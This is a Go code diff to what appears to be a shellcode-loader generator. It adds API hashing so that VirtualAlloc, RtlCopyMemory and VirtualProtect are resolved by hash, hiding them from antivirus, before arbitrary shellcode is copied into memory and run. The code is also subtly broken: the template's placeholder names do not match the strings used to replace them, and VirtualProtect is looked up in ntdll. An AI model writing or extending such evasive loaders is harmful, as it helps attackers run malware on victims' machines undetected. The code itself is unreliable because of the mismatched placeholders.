@@ -2,13 +2,13 @@ package loaders
 
 import (
 	"fmt"
+	"github.com/cmepw/myph/v2/cli"
 	"strings"
 )
 
 type SyscallTemplate struct {
 	UseApiHashing bool
-	HashMethod    string
-	FunctionNames []string
+	HashMethod    cli.ApiHashTechnique
 }
 
 func (t SyscallTemplate) Import() string {
@@ -76,7 +76,21 @@ func (t SyscallTemplate) Init() string {
 
 func (t SyscallTemplate) Process() string {
 	if t.UseApiHashing {
-		return fmt.Sprintf(`
+
+		/*
+			FIXME(djnn): reading ntdll or kernel32 from disk sucks, we should recover it from PEB instead
+			but i will address this later
+
+			also, we should probably only read from ntdll
+		*/
+
+		hashedVirtualAlloc := t.HashMethod.HashItem("VirtualAlloc")
+		hashedVirtualProtect := t.HashMethod.HashItem("VirtualProtect")
+		hashedRtlCopyMemory := t.HashMethod.HashItem("RtlCopyMemory")
+
+		hashedMethod := t.HashMethod.String()
+
+		template := fmt.Sprintf(`
 
     ntdll, err := pe.Open("C:\\Windows\\System32\\ntdll.dll"); if err != nil {
         fmt.Println(err.Error())
@@ -94,7 +108,7 @@ func (t SyscallTemplate) Process() string {
 
     var addr uintptr
 	regionsize := uintptr(len(shellcode))
-    VirtualAlloc, err := loader.LoadFunctionFromHash(loader.HashDJB2, "32b0ac787d4dba31", kernel32)
+    VirtualAlloc, err := loader.LoadFunctionFromHash(loader.Hash__HASH_METHOD__, "__HASHED_VIRTUALALLOC__", kernel32)
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -111,7 +125,7 @@ func (t SyscallTemplate) Process() string {
         log.Fatal("Error: null return value")
     }
 
-    RtlCopyMemory, err := loader.LoadFunctionFromHash(loader.HashDJB2, "7a4c2ed807c8fcf1", ntdll)
+    RtlCopyMemory, err := loader.LoadFunctionFromHash(loader.Hash__HASH_METHOD__, "_HASHED_RTLCOPYMEMORY__", ntdll)
     if err != nil {
 		log.Fatal(err)
 	}
@@ -126,7 +140,7 @@ func (t SyscallTemplate) Process() string {
     }
 
     oldProtect := PAGE_READWRITE
-    VirtualProtect, err := loader.LoadFunctionFromHash(loader.HashDJB2, "7126a1d34679917e", ntdll)
+    VirtualProtect, err := loader.LoadFunctionFromHash(loader.Hash__HASH_METHOD__, "__HASHED_VIRTUALPROTECT__", ntdll)
     if err != nil {
 		log.Fatal(err)
 	}
@@ -144,6 +158,12 @@ func (t SyscallTemplate) Process() string {
     _, _, _ = syscall.SyscallN(addr)
 
         `)
+
+		template = strings.ReplaceAll(template, "__HASH__METHOD__", hashedMethod)
+		template = strings.ReplaceAll(template, "__HASHED__VIRTUALPROTECT__", hashedVirtualProtect)
+		template = strings.ReplaceAll(template, "__HASHED__VIRTUALALLOC__", hashedVirtualAlloc)
+		template = strings.ReplaceAll(template, "__HASHED__RTLCOPYMEMORY__", hashedRtlCopyMemory)
+		return template
 	}
 
 	return fmt.Sprintf(`
